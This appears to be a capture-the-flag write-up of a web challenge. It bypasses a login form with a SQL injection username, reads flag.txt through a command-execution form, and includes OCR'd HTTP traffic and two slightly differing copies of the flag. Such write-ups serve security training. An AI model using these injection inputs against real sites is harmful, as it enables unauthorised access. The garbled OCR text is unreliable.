# Kitty
> Tetanus is a serious, potentially life-threatening infection that can be transmitted by an animal bite.

## About the Challenge
We got a website without the source code, and on this website it looks like we need to bypass the login page


[Image extracted text: Login
Username
Password
Login]


## How to Solve?
The login page is vulnerable to SQL injection, to bypass the login page we need to input this username and password:

```
U: admin" or true-- -
P: test
```


[Image extracted text: Request
Response
Pretty
Raw
Hex
3)
In
=
Pretty
Raw
Hex
Render
In
POST /login HTTP/1.1
HTTP/ 1.0
200
OK
2
Host:
45.33.123.243:5020
Content-Type
application/json
3 Content-Length:
52
3
Content-Length:
32
User-Agent:
Mozilla/5.0
(Windows
NT
10.0;
Win64;
X64)
AppleWebKit/537.36
4 Vary
Cookie
(KHTML ,
like
Gecko)
Chrome/120.0.6099.216 Safari/537.36
5
Set-Cookie:
session=
5
Content-Type=
application/json
eyJhdXRoZWSOaWNhdGVkIjpocnVlfq
ZaOrPA. emSx3cdPMVNVi-8EFZBEOGO2y4I;
HttpOnly;
6
Accept:
x/*
Path-/
Origin:
http://45.33.123.243
5020
Server:
Werkzeug/2.0.3 Python/3.6.15
8
Referer:
1/45.33.123
243:5020/
Date:
Sun ,
21
Jan
2024
14:33:32
GMT
Accept-Encoding
gzip,
deflate,
br
10
Accept-Language:
en-US, en;q-0.9
11
Cookie:
PHPSESSID-a3552603c979aea5a10acd9db11908c0
'message"
Login
successful!"
12
Connection:
close
13
10
14
username
'admin|
or
true _
password 
test"
http:]


And then inside the dashboard, there is another form where we can execute OS command


[Image extracted text: Enter Post:
Execute]


To obtain the flag, input `cat flag.txt`


[Image extracted text: Flag Post
KCTF{Fram3s_n3vE9_Lle_4_toGEtH3R}
Enter Post:
cat flag txt
Execute]


```
KCTF{Fram3S_n3vE9_L1e_4_toGEtH3R}
```